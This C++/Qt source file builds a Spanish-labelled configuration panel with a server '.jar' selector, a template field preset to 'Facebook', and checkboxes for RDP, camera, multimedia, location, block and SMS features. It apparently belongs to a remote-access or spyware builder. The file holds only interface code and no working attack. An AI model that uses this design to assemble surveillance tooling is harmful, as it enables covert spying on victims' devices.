/*
 * Copyright (C) 2024 Daniel Gómez(Less)
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

#include "ConfigurationTemplate.h"
#include <QPainter>
#include <QScrollArea>

ConfigurationTemplate::ConfigurationTemplate(QWidget *parent) : QWidget(parent) {
    // Establecer un tamaño mínimo para la ventana
    setMinimumSize(400, 300); // Ajusta según sea necesario

    // Crear el layout principal
    layout = new QVBoxLayout(this);

    // Título: "Seleccionar servidor"
    QLabel* serverLabel = new QLabel("Seleccionar servidor", this);
    QFont font = serverLabel->font();
    font.setBold(true);
    serverLabel->setFont(font);
    serverLabel->setStyleSheet("QLabel { color: white; }");
    layout->addWidget(serverLabel);

    // ComboBox de servidores con fondo blanco
    serverComboBox = new QComboBox(this);
    serverComboBox->addItems({"servidor-1.jar", "servidor-2.jar", "servidor-3.jar"});
    serverComboBox->setStyleSheet("QComboBox { background-color: white; color: black; }");
    layout->addWidget(serverComboBox);

    // Título: "Plantilla"
    QLabel* templateLabel = new QLabel("Plantilla", this);
    templateLabel->setFont(font);
    templateLabel->setStyleSheet("QLabel { color: white; }");
    layout->addWidget(templateLabel);

    // Campo de texto "Facebook" con fondo blanco
    templateLineEdit = new QLineEdit(this);
    templateLineEdit->setText("Facebook");
    templateLineEdit->setStyleSheet("QLineEdit { background-color: white; color: black; }");
    layout->addWidget(templateLineEdit);

    // Título: "Selector de funcionalidades"
    QLabel* functionalitiesLabel = new QLabel("Selector de funcionalidades", this);
    functionalitiesLabel->setFont(font);
    functionalitiesLabel->setStyleSheet("QLabel { color: white; }");
    layout->addWidget(functionalitiesLabel);

    // Layout de funcionalidades sin scroll
    QWidget* functionalitiesWidget = new QWidget(this);
    QVBoxLayout* functionalitiesLayout = new QVBoxLayout(functionalitiesWidget);

    // Checkboxes de funcionalidades con cuadros blancos
    QStringList functionalities = {"Todos", "RDP", "CAMERA", "MULTIMEDIA", "LOCATION", "BLOCK", "SMS"};
    for (const QString& functionality : functionalities) {
        QCheckBox* checkBox = new QCheckBox(functionality, functionalitiesWidget);
        functionalitiesCheckBoxes.append(checkBox);
        checkBox->setStyleSheet("QCheckBox { color: white; } QCheckBox::indicator { background-color: white; }");
        functionalitiesLayout->addWidget(checkBox);

        if (functionality == "Todos") {
            connect(checkBox, &QCheckBox::toggled, this, &ConfigurationTemplate::selectAllFunctionalities);
        }
    }

    functionalitiesWidget->setLayout(functionalitiesLayout);
    layout->addWidget(functionalitiesWidget);

    // Crear el scroll area y hacer que sea transparente
    QScrollArea* scrollArea = new QScrollArea(this);
    scrollArea->setWidgetResizable(true);

    // Hacer que el scrollArea sea transparente
    scrollArea->setStyleSheet("QScrollArea { background: transparent; }");

    // Crear un contenedor para los widgets y hacerlo transparente también
    QWidget* containerWidget = new QWidget(this);
    containerWidget->setLayout(layout);
    containerWidget->setStyleSheet("QWidget { background: transparent; }");

    // Establecer el widget transparente en el scroll area
    scrollArea->setWidget(containerWidget);

    // Layout principal con el scroll area
    QVBoxLayout* mainLayout = new QVBoxLayout(this);
    mainLayout->setContentsMargins(10, 25, 10, 25);
    mainLayout->addWidget(scrollArea);
    setLayout(mainLayout);
}


void ConfigurationTemplate::selectAllFunctionalities(bool checked) {
    // Al seleccionar "Todos", marcar/desmarcar todos los demás checkboxes
    for (QCheckBox* checkBox : functionalitiesCheckBoxes) {
        if (checkBox->text() != "Todos") {
            checkBox->setChecked(checked);
        }
    }
}

void ConfigurationTemplate::resizeEvent(QResizeEvent* event) {
    // Recalcular los márgenes dinámicamente
    int paddingVertical = height() * 0.10;  // 10% del alto
    int paddingHorizontal = width() * 0.20; // 20% del ancho
    layout->setContentsMargins(paddingHorizontal, paddingVertical, paddingHorizontal, paddingVertical);

    QWidget::resizeEvent(event); // Llamar a la implementación por defecto
}

void ConfigurationTemplate::paintEvent(QPaintEvent *event) {
    QPainter painter(this);
    painter.setRenderHint(QPainter::Antialiasing);

    // Fondo negro semi-transparente
    QBrush brush(QColor(0, 0, 0, 115));  // Color de fondo negro con transparencia
    painter.setBrush(brush);

    // Pen para el borde
    QPen pen(QColor("#FF0000"));  // Color rojo para el borde
    pen.setWidth(4);
    painter.setPen(pen);

    // Calcular el padding dinámico para el borde del rectángulo
    int paddingHorizontal = width() * 0.20;  // 20% del ancho
    int paddingVertical = height() * 0.05;   // 10% de la altura

    // Dibujar rectángulo con bordes redondeados de 20px y el padding ajustado
    painter.drawRoundedRect(paddingHorizontal, paddingVertical,
                            width() - 2 * paddingHorizontal,
                            height() - 2 * paddingVertical, 20, 20);

    QWidget::paintEvent(event);
}
